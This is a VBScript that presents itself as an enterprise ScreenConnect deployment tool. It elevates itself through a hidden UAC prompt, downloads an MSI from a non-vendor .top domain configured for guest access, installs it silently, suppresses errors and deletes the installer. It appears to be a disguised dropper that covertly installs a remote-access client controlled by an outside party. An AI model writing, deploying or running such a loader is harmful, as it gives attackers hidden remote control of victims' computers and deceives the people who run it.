' ScreenConnect Enterprise Deployer v4.1
' Optimized for: High Compatibility & Enterprise Logging
' Requirements: Administrative Privileges

Option Explicit
On Error Resume Next

' --- Configuration ---
Dim AppName, MsiUrl, LogFile, InstallerPath
AppName       = "ScreenConnect Client"
' TODO: Ensure this is your official company MSI link
MsiUrl        = "https://www.wpkm65.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
InstallerPath = "C:\Windows\Temp\SC_Installer.msi"
LogFile       = "C:\ProgramData\SC_Deployment.log"

Dim WshShell, FSO, ShellApp
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' --- 1. Elevation Check (Prevents Permission Errors) ---
If Not WScript.Arguments.Named.Exists("elevate") Then
    Set ShellApp = CreateObject("Shell.Application")
    ' This triggers the UAC prompt you see in your image
    ShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevate", "", "runas", 0
    WScript.Quit
End If

' --- 2. Deployment Logic ---
Call WriteLog("INFO", "Starting Deployment for " & AppName)

' Download via PowerShell (TLS 1.2 compliant)
Dim downloadCmd, downloadResult
downloadCmd = "powershell.exe -NoProfile -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & MsiUrl & "', '" & InstallerPath & "')"""

downloadResult = WshShell.Run(downloadCmd, 0, True)

If downloadResult = 0 And FSO.FileExists(InstallerPath) Then
    ' Execute Silent MSI Install
    Dim installResult
    installResult = WshShell.Run("msiexec.exe /i """ & InstallerPath & """ /qn /norestart", 0, True)
    
    If installResult = 0 Then
        Call WriteLog("SUCCESS", "Installation completed.")
    Else
        Call WriteLog("ERROR", "MSI Exit Code: " & installResult)
    End If
Else
    Call WriteLog("ERROR", "Download failed.")
End If

' --- 3. Cleanup ---
If FSO.FileExists(InstallerPath) Then FSO.DeleteFile InstallerPath, True
WScript.Quit 0

Sub WriteLog(sType, sMessage)
    On Error Resume Next
    Dim objLog: Set objLog = FSO.OpenTextFile(LogFile, 8, True)
    objLog.WriteLine "[" & Now & "] [" & sType & "] " & sMessage
    objLog.Close
End Sub
